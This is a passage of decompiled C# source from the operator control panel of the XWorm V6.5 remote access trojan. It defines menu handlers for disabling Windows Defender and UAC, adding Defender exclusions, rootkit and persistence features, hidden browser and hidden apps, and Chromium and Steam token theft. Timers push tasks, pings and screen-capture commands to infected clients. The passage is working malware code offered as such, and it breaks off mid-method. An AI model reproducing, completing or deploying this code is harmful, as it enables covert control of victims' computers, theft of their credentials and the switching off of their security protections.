		internal virtual ToolStripMenuItem WDDisableToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._WDDisableToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.WDDisableToolStripMenuItem_Click);
				ToolStripMenuItem wddisableToolStripMenuItem = this._WDDisableToolStripMenuItem;
				if (wddisableToolStripMenuItem != null)
				{
					wddisableToolStripMenuItem.Click -= value2;
				}
				this._WDDisableToolStripMenuItem = value;
				wddisableToolStripMenuItem = this._WDDisableToolStripMenuItem;
				if (wddisableToolStripMenuItem != null)
				{
					wddisableToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001AF RID: 431
		// (get) Token: 0x06000400 RID: 1024 RVA: 0x000237AB File Offset: 0x000219AB
		// (set) Token: 0x06000401 RID: 1025 RVA: 0x000237B8 File Offset: 0x000219B8
		internal virtual ToolStripMenuItem WDExclusionToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._WDExclusionToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.WDExclusionToolStripMenuItem_Click);
				ToolStripMenuItem wdexclusionToolStripMenuItem = this._WDExclusionToolStripMenuItem;
				if (wdexclusionToolStripMenuItem != null)
				{
					wdexclusionToolStripMenuItem.Click -= value2;
				}
				this._WDExclusionToolStripMenuItem = value;
				wdexclusionToolStripMenuItem = this._WDExclusionToolStripMenuItem;
				if (wdexclusionToolStripMenuItem != null)
				{
					wdexclusionToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001B0 RID: 432
		// (get) Token: 0x06000402 RID: 1026 RVA: 0x000237FB File Offset: 0x000219FB
		// (set) Token: 0x06000403 RID: 1027 RVA: 0x00023805 File Offset: 0x00021A05
		public virtual ColumnHeader _Ping { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001B1 RID: 433
		// (get) Token: 0x06000404 RID: 1028 RVA: 0x0002380E File Offset: 0x00021A0E
		// (set) Token: 0x06000405 RID: 1029 RVA: 0x00023818 File Offset: 0x00021A18
		public virtual ColumnHeader _ActiveWindow { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001B2 RID: 434
		// (get) Token: 0x06000406 RID: 1030 RVA: 0x00023821 File Offset: 0x00021A21
		// (set) Token: 0x06000407 RID: 1031 RVA: 0x0002382B File Offset: 0x00021A2B
		internal virtual Guna2Panel Guna2Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001B3 RID: 435
		// (get) Token: 0x06000408 RID: 1032 RVA: 0x00023834 File Offset: 0x00021A34
		// (set) Token: 0x06000409 RID: 1033 RVA: 0x0002383E File Offset: 0x00021A3E
		internal virtual Guna2Panel Guna2Panel5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001B4 RID: 436
		// (get) Token: 0x0600040A RID: 1034 RVA: 0x00023847 File Offset: 0x00021A47
		// (set) Token: 0x0600040B RID: 1035 RVA: 0x00023854 File Offset: 0x00021A54
		internal virtual ToolStripMenuItem WDExclusionToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._WDExclusionToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.WDExclusionToolStripMenuItem1_Click);
				ToolStripMenuItem wdexclusionToolStripMenuItem = this._WDExclusionToolStripMenuItem1;
				if (wdexclusionToolStripMenuItem != null)
				{
					wdexclusionToolStripMenuItem.Click -= value2;
				}
				this._WDExclusionToolStripMenuItem1 = value;
				wdexclusionToolStripMenuItem = this._WDExclusionToolStripMenuItem1;
				if (wdexclusionToolStripMenuItem != null)
				{
					wdexclusionToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001B5 RID: 437
		// (get) Token: 0x0600040C RID: 1036 RVA: 0x00023897 File Offset: 0x00021A97
		// (set) Token: 0x0600040D RID: 1037 RVA: 0x000238A4 File Offset: 0x00021AA4
		internal virtual ToolStripMenuItem UninstallPluginsToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._UninstallPluginsToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UninstallPluginsToolStripMenuItem_Click);
				ToolStripMenuItem uninstallPluginsToolStripMenuItem = this._UninstallPluginsToolStripMenuItem;
				if (uninstallPluginsToolStripMenuItem != null)
				{
					uninstallPluginsToolStripMenuItem.Click -= value2;
				}
				this._UninstallPluginsToolStripMenuItem = value;
				uninstallPluginsToolStripMenuItem = this._UninstallPluginsToolStripMenuItem;
				if (uninstallPluginsToolStripMenuItem != null)
				{
					uninstallPluginsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001B6 RID: 438
		// (get) Token: 0x0600040E RID: 1038 RVA: 0x000238E7 File Offset: 0x00021AE7
		// (set) Token: 0x0600040F RID: 1039 RVA: 0x000238F4 File Offset: 0x00021AF4
		internal virtual ToolStripMenuItem RunRecoveryToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._RunRecoveryToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RunRecoveryToolStripMenuItem_Click);
				ToolStripMenuItem runRecoveryToolStripMenuItem = this._RunRecoveryToolStripMenuItem;
				if (runRecoveryToolStripMenuItem != null)
				{
					runRecoveryToolStripMenuItem.Click -= value2;
				}
				this._RunRecoveryToolStripMenuItem = value;
				runRecoveryToolStripMenuItem = this._RunRecoveryToolStripMenuItem;
				if (runRecoveryToolStripMenuItem != null)
				{
					runRecoveryToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001B7 RID: 439
		// (get) Token: 0x06000410 RID: 1040 RVA: 0x00023937 File Offset: 0x00021B37
		// (set) Token: 0x06000411 RID: 1041 RVA: 0x00023944 File Offset: 0x00021B44
		internal virtual ToolStripMenuItem RunRecoveryToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._RunRecoveryToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RunRecoveryToolStripMenuItem1_Click);
				ToolStripMenuItem runRecoveryToolStripMenuItem = this._RunRecoveryToolStripMenuItem1;
				if (runRecoveryToolStripMenuItem != null)
				{
					runRecoveryToolStripMenuItem.Click -= value2;
				}
				this._RunRecoveryToolStripMenuItem1 = value;
				runRecoveryToolStripMenuItem = this._RunRecoveryToolStripMenuItem1;
				if (runRecoveryToolStripMenuItem != null)
				{
					runRecoveryToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001B8 RID: 440
		// (get) Token: 0x06000412 RID: 1042 RVA: 0x00023987 File Offset: 0x00021B87
		// (set) Token: 0x06000413 RID: 1043 RVA: 0x00023994 File Offset: 0x00021B94
		internal virtual ToolStripMenuItem HiddenBrowserToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._HiddenBrowserToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.HiddenBrowserToolStripMenuItem_Click);
				ToolStripMenuItem hiddenBrowserToolStripMenuItem = this._HiddenBrowserToolStripMenuItem;
				if (hiddenBrowserToolStripMenuItem != null)
				{
					hiddenBrowserToolStripMenuItem.Click -= value2;
				}
				this._HiddenBrowserToolStripMenuItem = value;
				hiddenBrowserToolStripMenuItem = this._HiddenBrowserToolStripMenuItem;
				if (hiddenBrowserToolStripMenuItem != null)
				{
					hiddenBrowserToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001B9 RID: 441
		// (get) Token: 0x06000414 RID: 1044 RVA: 0x000239D7 File Offset: 0x00021BD7
		// (set) Token: 0x06000415 RID: 1045 RVA: 0x000239E4 File Offset: 0x00021BE4
		internal virtual ToolStripMenuItem HiddenAppsToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._HiddenAppsToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.HiddenAppsToolStripMenuItem_Click);
				ToolStripMenuItem hiddenAppsToolStripMenuItem = this._HiddenAppsToolStripMenuItem;
				if (hiddenAppsToolStripMenuItem != null)
				{
					hiddenAppsToolStripMenuItem.Click -= value2;
				}
				this._HiddenAppsToolStripMenuItem = value;
				hiddenAppsToolStripMenuItem = this._HiddenAppsToolStripMenuItem;
				if (hiddenAppsToolStripMenuItem != null)
				{
					hiddenAppsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001BA RID: 442
		// (get) Token: 0x06000416 RID: 1046 RVA: 0x00023A27 File Offset: 0x00021C27
		// (set) Token: 0x06000417 RID: 1047 RVA: 0x00023A34 File Offset: 0x00021C34
		internal virtual ToolStripMenuItem ChromiumToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._ChromiumToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ChromiumToolStripMenuItem_Click);
				ToolStripMenuItem chromiumToolStripMenuItem = this._ChromiumToolStripMenuItem;
				if (chromiumToolStripMenuItem != null)
				{
					chromiumToolStripMenuItem.Click -= value2;
				}
				this._ChromiumToolStripMenuItem = value;
				chromiumToolStripMenuItem = this._ChromiumToolStripMenuItem;
				if (chromiumToolStripMenuItem != null)
				{
					chromiumToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001BB RID: 443
		// (get) Token: 0x06000418 RID: 1048 RVA: 0x00023A77 File Offset: 0x00021C77
		// (set) Token: 0x06000419 RID: 1049 RVA: 0x00023A84 File Offset: 0x00021C84
		internal virtual ToolStripMenuItem ChromiumToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._ChromiumToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ChromiumToolStripMenuItem1_Click);
				ToolStripMenuItem chromiumToolStripMenuItem = this._ChromiumToolStripMenuItem1;
				if (chromiumToolStripMenuItem != null)
				{
					chromiumToolStripMenuItem.Click -= value2;
				}
				this._ChromiumToolStripMenuItem1 = value;
				chromiumToolStripMenuItem = this._ChromiumToolStripMenuItem1;
				if (chromiumToolStripMenuItem != null)
				{
					chromiumToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001BC RID: 444
		// (get) Token: 0x0600041A RID: 1050 RVA: 0x00023AC7 File Offset: 0x00021CC7
		// (set) Token: 0x0600041B RID: 1051 RVA: 0x00023AD4 File Offset: 0x00021CD4
		internal virtual ToolStripMenuItem VoiceChatToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._VoiceChatToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.VoiceChatToolStripMenuItem_Click);
				ToolStripMenuItem voiceChatToolStripMenuItem = this._VoiceChatToolStripMenuItem;
				if (voiceChatToolStripMenuItem != null)
				{
					voiceChatToolStripMenuItem.Click -= value2;
				}
				this._VoiceChatToolStripMenuItem = value;
				voiceChatToolStripMenuItem = this._VoiceChatToolStripMenuItem;
				if (voiceChatToolStripMenuItem != null)
				{
					voiceChatToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001BD RID: 445
		// (get) Token: 0x0600041C RID: 1052 RVA: 0x00023B17 File Offset: 0x00021D17
		// (set) Token: 0x0600041D RID: 1053 RVA: 0x00023B21 File Offset: 0x00021D21
		internal virtual ToolStripMenuItem V20AutoToolStripMenuItem1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001BE RID: 446
		// (get) Token: 0x0600041E RID: 1054 RVA: 0x00023B2A File Offset: 0x00021D2A
		// (set) Token: 0x0600041F RID: 1055 RVA: 0x00023B34 File Offset: 0x00021D34
		internal virtual ToolStripMenuItem KitToolStripMenuItem1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001BF RID: 447
		// (get) Token: 0x06000420 RID: 1056 RVA: 0x00023B3D File Offset: 0x00021D3D
		// (set) Token: 0x06000421 RID: 1057 RVA: 0x00023B48 File Offset: 0x00021D48
		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RootkitToolStripMenuItem1_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem1;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem1 = value;
				toolStripMenuItem = this._ToolStripMenuItem1;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001C0 RID: 448
		// (get) Token: 0x06000422 RID: 1058 RVA: 0x00023B8B File Offset: 0x00021D8B
		// (set) Token: 0x06000423 RID: 1059 RVA: 0x00023B98 File Offset: 0x00021D98
		internal virtual ToolStripMenuItem ToolStripMenuItem2
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ResetSurvivalToolStripMenuItem2_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem2;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem2 = value;
				toolStripMenuItem = this._ToolStripMenuItem2;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001C1 RID: 449
		// (get) Token: 0x06000424 RID: 1060 RVA: 0x00023BDB File Offset: 0x00021DDB
		// (set) Token: 0x06000425 RID: 1061 RVA: 0x00023BE8 File Offset: 0x00021DE8
		internal virtual ToolStripMenuItem SteamTokennToolStripMenuItem3
		{
			[CompilerGenerated]
			get
			{
				return this._SteamTokennToolStripMenuItem3;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SteamTokenRecoveryToolStripMenuItem3_Click);
				ToolStripMenuItem steamTokennToolStripMenuItem = this._SteamTokennToolStripMenuItem3;
				if (steamTokennToolStripMenuItem != null)
				{
					steamTokennToolStripMenuItem.Click -= value2;
				}
				this._SteamTokennToolStripMenuItem3 = value;
				steamTokennToolStripMenuItem = this._SteamTokennToolStripMenuItem3;
				if (steamTokennToolStripMenuItem != null)
				{
					steamTokennToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001C2 RID: 450
		// (get) Token: 0x06000426 RID: 1062 RVA: 0x00023C2B File Offset: 0x00021E2B
		// (set) Token: 0x06000427 RID: 1063 RVA: 0x00023C38 File Offset: 0x00021E38
		internal virtual ToolStripMenuItem V20TwoToolStripMenuItem3
		{
			[CompilerGenerated]
			get
			{
				return this._V20TwoToolStripMenuItem3;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.V20RecoveryToolStripMenuItem3_Click);
				ToolStripMenuItem v20TwoToolStripMenuItem = this._V20TwoToolStripMenuItem3;
				if (v20TwoToolStripMenuItem != null)
				{
					v20TwoToolStripMenuItem.Click -= value2;
				}
				this._V20TwoToolStripMenuItem3 = value;
				v20TwoToolStripMenuItem = this._V20TwoToolStripMenuItem3;
				if (v20TwoToolStripMenuItem != null)
				{
					v20TwoToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001C3 RID: 451
		// (get) Token: 0x06000428 RID: 1064 RVA: 0x00023C7B File Offset: 0x00021E7B
		// (set) Token: 0x06000429 RID: 1065 RVA: 0x00023C88 File Offset: 0x00021E88
		internal virtual ToolStripMenuItem DisableUACToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._DisableUACToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DisableUACToolStripMenuItem_Click);
				ToolStripMenuItem disableUACToolStripMenuItem = this._DisableUACToolStripMenuItem;
				if (disableUACToolStripMenuItem != null)
				{
					disableUACToolStripMenuItem.Click -= value2;
				}
				this._DisableUACToolStripMenuItem = value;
				disableUACToolStripMenuItem = this._DisableUACToolStripMenuItem;
				if (disableUACToolStripMenuItem != null)
				{
					disableUACToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x0600042A RID: 1066
		[DllImport("uxtheme", CharSet = CharSet.Unicode)]
		public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);

		// Token: 0x0600042B RID: 1067 RVA: 0x00023CCC File Offset: 0x00021ECC
		public Main()
		{
			base.Load += this.Form1_Load;
			base.FormClosing += this.Form1_FormClosing;
			base.FormClosed += this.Form1_FormClosed;
			base.Activated += this.Form1_Activated;
			base.Deactivate += this.Form1_Deactivate;
			this.getTasks = new List<XWormTask>();
			this.InitializeComponent();
			base.Opacity = 0.0;
			this.Lv2.Visible = false;
			this.Lv3.Visible = false;
			this.Lv4.Visible = false;
			Main.SetWindowTheme(this.Lv1.Handle, "explorer", null);
			Helper.FadeInMain(this, 20);
		}

		// Token: 0x0600042C RID: 1068 RVA: 0x00023DAC File Offset: 0x00021FAC
		private void Form1_Load(object sender, EventArgs e)
		{
			this.Guna2HtmlToolTip1.SetToolTip(this.Guna2Button1, "Clients");
			this.Guna2HtmlToolTip1.SetToolTip(this.Guna2Button2, "Logs");
			this.Guna2HtmlToolTip1.SetToolTip(this.Guna2Button3, "Tasks");
			this.Guna2HtmlToolTip1.SetToolTip(this.Guna2Button4, "Screens");
			this.Guna2HtmlToolTip1.SetToolTip(this.Guna2Button5, "About");
			this.Guna2HtmlToolTip1.SetToolTip(this.Guna2Button6, "Extra Tools");
			this.Guna2HtmlToolTip1.SetToolTip(this.Guna2Button7, "Builder");
		}

		// Token: 0x0600042D RID: 1069 RVA: 0x00023E5C File Offset: 0x0002205C
		public object GetSelectedClients()
		{
			Main._Closure$__770-0 CS$<>8__locals1 = new Main._Closure$__770-0(CS$<>8__locals1);
			CS$<>8__locals1.$VB$Me = this;
			CS$<>8__locals1.$VB$Local_clients = new List<Client>();
			base.Invoke(new VB$AnonymousDelegate_0(delegate()
			{
				object listViewSafeThreading = SettingsHelper.ListViewSafeThreading;
				ObjectFlowControl.CheckForSyncLockOnValueType(listViewSafeThreading);
				lock (listViewSafeThreading)
				{
					try
					{
						foreach (object obj in CS$<>8__locals1.$VB$Me.Lv1.SelectedItems)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							CS$<>8__locals1.$VB$Local_clients.Add((Client)listViewItem.Tag);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}));
			return CS$<>8__locals1.$VB$Local_clients.ToArray();
		}

		// Token: 0x0600042E RID: 1070 RVA: 0x00023EA8 File Offset: 0x000220A8
		private void Timer_Status_Tick(object sender, EventArgs e)
		{
			try
			{
				this.ToolStripStatusLabel1.Text = string.Format("Clients [{0}]   Selected [{1}]   Port [{2}]   Key [{3}]   Sent [{4}]   Received [{5}]   Expiry [{6}]", new object[]
				{
					this.Lv1.Items.Count.ToString(),
					this.Lv1.SelectedItems.Count.ToString(),
					SettingsHelper.Port,
					SettingsHelper.KEY,
					Helper.BytesToString(SettingsHelper.Sent),
					Helper.BytesToString(SettingsHelper.Received),
					SettingsHelper.LicenseExpire
				});
				this.Text = string.Concat(checked(new string[]
				{
					"XWorm V6.5 by c3lestial.fun @",
					SettingsHelper.User,
					"   ",
					DateTime.Now.ToLongTimeString(),
					"   CPU ",
					Conversions.ToString((int)Math.Round((double)this.performanceCounter1.NextValue())),
					"%   RAM ",
					Conversions.ToString((int)Math.Round((double)this.performanceCounter2.NextValue())),
					"%"
				}));
				bool flag = SettingsHelper.MSGS > 50;
				if (flag)
				{
					this.Guna2NotificationPaint1.Text = "+50";
				}
				else
				{
					bool flag2 = SettingsHelper.MSGS == 0;
					if (flag2)
					{
						this.Guna2NotificationPaint1.Text = SettingsHelper.MSGS.ToString();
					}
					else
					{
						this.Guna2NotificationPaint1.Text = "+" + SettingsHelper.MSGS.ToString();
					}
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600042F RID: 1071 RVA: 0x00024070 File Offset: 0x00022270
		private void Timer_Ping_Tick(object sender, EventArgs e)
		{
			bool flag = SettingsHelper.Online.Count > 0;
			if (flag)
			{
				byte[] state = Helper.SB("PING!");
				try
				{
					foreach (Client $VB$NonLocal_ in SettingsHelper.Online.ToList<Client>())
					{
						Main._Closure$__R772-0 CS$<>8__locals1 = new Main._Closure$__R772-0(CS$<>8__locals1);
						CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
				}
				finally
				{
					List<Client>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
			}
			GC.Collect();
		}

		// Token: 0x06000430 RID: 1072 RVA: 0x00024110 File Offset: 0x00022310
		private void Lv1_MouseMove(object sender, MouseEventArgs e)
		{
			try
			{
				ListViewHitTestInfo listViewHitTestInfo = this.Lv1.HitTest(e.Location);
				bool flag = e.Button == MouseButtons.Left && (listViewHitTestInfo.Item != null || listViewHitTestInfo.SubItem != null);
				if (flag)
				{
					this.Lv1.Items[listViewHitTestInfo.Item.Index].Selected = true;
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000431 RID: 1073 RVA: 0x000241AC File Offset: 0x000223AC
		private void Lv1_KeyDown(object sender, KeyEventArgs e)
		{
			try
			{
				bool flag = e.Modifiers == Keys.Control && e.KeyCode == Keys.A;
				if (flag)
				{
					bool flag2 = this.Lv1.Items.Count > 0;
					if (flag2)
					{
						try
						{
							foreach (object obj in this.Lv1.Items)
							{
								ListViewItem listViewItem = (ListViewItem)obj;
								listViewItem.Selected = true;
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000432 RID: 1074 RVA: 0x0002427C File Offset: 0x0002247C
		private void NotifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
		{
			try
			{
				base.TopMost = true;
				base.WindowState = FormWindowState.Normal;
				base.TopMost = false;
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000433 RID: 1075 RVA: 0x000242D4 File Offset: 0x000224D4
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				this.NotifyIcon1.Visible = false;
				Environment.Exit(0);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000434 RID: 1076 RVA: 0x00024318 File Offset: 0x00022518
		public void ShowLog()
		{
			try
			{
				this.Lv1.Visible = false;
				this.Lv3.Visible = false;
				this.Lv4.Visible = false;
				this.Lv2.Visible = true;
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000435 RID: 1077 RVA: 0x0002438C File Offset: 0x0002258C
		private async void TimerTask_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.getTasks.Count > 0 && SettingsHelper.Online.Count > 0;
				if (flag)
				{
					try
					{
						foreach (XWormTask asyncTask in this.getTasks.ToList<XWormTask>())
						{
							bool flag2 = !this.GetListview(asyncTask.id);
							if (flag2)
							{
								this.getTasks.Remove(asyncTask);
								Debug.WriteLine("task removed");
								break;
							}
							try
							{
								foreach (Client C in SettingsHelper.Online.ToList<Client>())
								{
									bool flag3 = !asyncTask.doneClient.Contains(C.ID);
									if (flag3)
									{
										Debug.WriteLine("task executed");
										asyncTask.doneClient.Add(C.ID);
										this.SetExecution(asyncTask.id);
										Main._Closure$__R778-2 CS$<>8__locals1 = new Main._Closure$__R778-2(CS$<>8__locals1);
										CS$<>8__locals1.$VB$NonLocal_2 = C;
										ThreadPool.QueueUserWorkItem(delegate(object a0)
										{
											CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
										}, asyncTask.msgPack);
									}
								}
							}
							finally
							{
								List<Client>.Enumerator enumerator2;
								((IDisposable)enumerator2).Dispose();
							}
							await Task.Delay(15000);
						}
					}
					finally
					{
						List<XWormTask>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000436 RID: 1078 RVA: 0x000243D4 File Offset: 0x000225D4
		private void SetExecution(string id)
		{
			checked
			{
				try
				{
					foreach (object obj in this.Lv3.Items)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						bool flag = Operators.CompareString(listViewItem.ToolTipText, id, false) == 0;
						if (flag)
						{
							int num = Convert.ToInt32(listViewItem.SubItems[1].Text);
							num++;
							listViewItem.SubItems[1].Text = num.ToString();
						}
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x06000437 RID: 1079 RVA: 0x00024480 File Offset: 0x00022680
		private bool GetListview(string id)
		{
			try
			{
				foreach (object obj in this.Lv3.Items)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					bool flag = Operators.CompareString(listViewItem.ToolTipText, id, false) == 0;
					if (flag)
					{
						return true;
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			return false;
		}

		// Token: 0x06000438 RID: 1080 RVA: 0x00024500 File Offset: 0x00022700
		private void ThumbnailCap_Tick(object sender, EventArgs e)
		{
			try
			{
				byte[] state = Helper.SB("$Cap");
				try
				{
					foreach (Client $VB$NonLocal_ in SettingsHelper.Online.ToList<Client>())
					{
						Main._Closure$__R781-4 CS$<>8__locals1 = new Main._Closure$__R781-4(CS$<>8__locals1);
						CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
				}
				finally
				{
					List<Client>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000439 RID: 1081 RVA: 0x00003234 File Offset: 0x00001434
		private void Lv4_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600043A RID: 1082 RVA: 0x00003234 File Offset: 0x00001434
		private void Form1_FormClosed(object sender, FormClosedEventArgs e)
		{
		}

		// Token: 0x0600043B RID: 1083 RVA: 0x00003234 File Offset: 0x00001434
		private void Lv1_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600043C RID: 1084 RVA: 0x000245B0 File Offset: 0x000227B0
		private void Guna2Button1_Click(object sender, EventArgs e)
		{
			try
			{
				this.Lv2.Visible = false;
				this.Lv3.Visible = false;
				this.Lv4.Visible = false;
				this.Lv1.Visible = true;
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600043D RID: 1085 RVA: 0x00024614 File Offset: 0x00022814
		private void Guna2Button2_Click(object sender, EventArgs e)
		{
			try
			{
				this.Lv1.Visible = false;
				this.Lv3.Visible = false;
				this.Lv4.Visible = false;
				this.Lv2.Visible = true;
				SettingsHelper.MSGS = 0;
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600043E RID: 1086 RVA: 0x00024680 File Offset: 0x00022880
		private void Guna2Button3_Click(object sender, EventArgs e)
		{
			try
			{
				this.Lv1.Visible = false;
				this.Lv2.Visible = false;
				this.Lv4.Visible = false;
				this.Lv3.Visible = true;
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600043F RID: 1087 RVA: 0x000246E4 File Offset: 0x000228E4
		private void Guna2Button4_Click(object sender, EventArgs e)
		{
			try
			{
				this.Lv1.Visible = false;
				this.Lv2.Visible = false;
				this.Lv3.Visible = false;
				this.Lv4.Visible = true;
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000440 RID: 1088 RVA: 0x00024748 File Offset: 0x00022948
		private void ShowToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				base.TopMost = true;
				base.WindowState = FormWindowState.Normal;
				base.TopMost = false;
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000441 RID: 1089 RVA: 0x000247A0 File Offset: 0x000229A0
		private void RestartToolStripMenuItem1_Click_1(object sender, EventArgs e)
		{
			Process.Start(Application.ExecutablePath);
			base.Close();
		}

		// Token: 0x06000442 RID: 1090 RVA: 0x000247B5 File Offset: 0x000229B5
		private void ExitToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
